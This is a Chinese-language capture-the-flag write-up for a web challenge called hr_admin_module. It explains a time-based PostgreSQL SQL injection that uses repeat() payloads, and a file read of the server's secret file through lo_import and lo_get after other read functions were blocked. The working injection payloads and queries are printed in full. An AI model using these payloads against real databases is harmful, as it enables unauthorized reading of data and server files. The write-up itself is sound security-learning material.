# hr_admin_module

Solved: 4

<br>

這題是這場我花最多時間的 web 題，不過還蠻好玩的，發現很多新招XD

首先是 SQL Injection:

從 `user_search` 參數可以發現 SQL Injection 特徵

當我輸入不合 SQL 語法時，會噴 Warning ，但他是第二次 Request 才會顯示

e.g. 

- 有warning: `admin'` or `admin'-` ...

- 沒warning: `admin'--` or `admin''` or `admin' and 1=2 --` ...

而且這題似乎擋了很多東西，`pg_sleep`無法用，`dblink`簡單踹一下似乎也沒dns request (但賽後才知道好像其實可以?)

後來就發現 `repeat()` 可以讓 Server 卡住 

e.g. `'and 1=2 union select NULL, (select case when 1=1 then (select repeat('a', 10000000)) else NULL end)--`

所以我們就有了 Time-based 的 SQL Injection

先撈一些基本資訊:

```
version: (Debian 11.2-1.pgdg90+1)
current_db: docker_db
current_schema: public
table of public: searches
columns of searches: id,search
current_query: SELECT * FROM searches WHERE search = 'YOUR_INPUT'
```

但後來撈了一整天，DB 裡面沒看到啥可用的東西，`pg_read_file` , `pg_ls_dir` 等函數也都不能用

可是 `/var/lib/postgresql/data/secret` 這個 path 很明顯是 default data directory

所以應該還是有辦法能讀檔

猜測是要找到某個沒被限制的函數去讀檔

找了無數個小時，還翻了postgres src

最後我在本機 local 端，試著找所有名字包含`read`的 function: 

`SELECT proname FROM pg_proc WHERE proname like '%read%';`

=>

```
 loread
 pg_stat_get_db_blk_read_time
 pg_read_file_old
 pg_read_file
 pg_read_binary_file
```

最後根據第一筆結果找到 `lo_import`, `lo_read`(`loread`), `lo_open`, ... 這些同系列的 function

https://www.postgresql.org/docs/11/lo-funcs.html

官方文件中表示`lo_import` 可以把檔案載入進 Object 中

遠端測試: `lo_import('/var/lib/postgresql/data/secret')`

有回傳一個 OID 回來，所以代表 flag 有成功載入進去

接著用 `lo_get(OID)`，把這個 OID 對應的 Object 讀出來就行

```
select cast(lo_import('/var/lib/postgresql/data/secret') as text)
=> 18440

select cast(lo_get(18440) as text)
=> \x66627b4040646e....
```


`fb{@@dns_3xfil_f0r_the_w1n!!@@}`

(it looks like this is unintended solution :p)

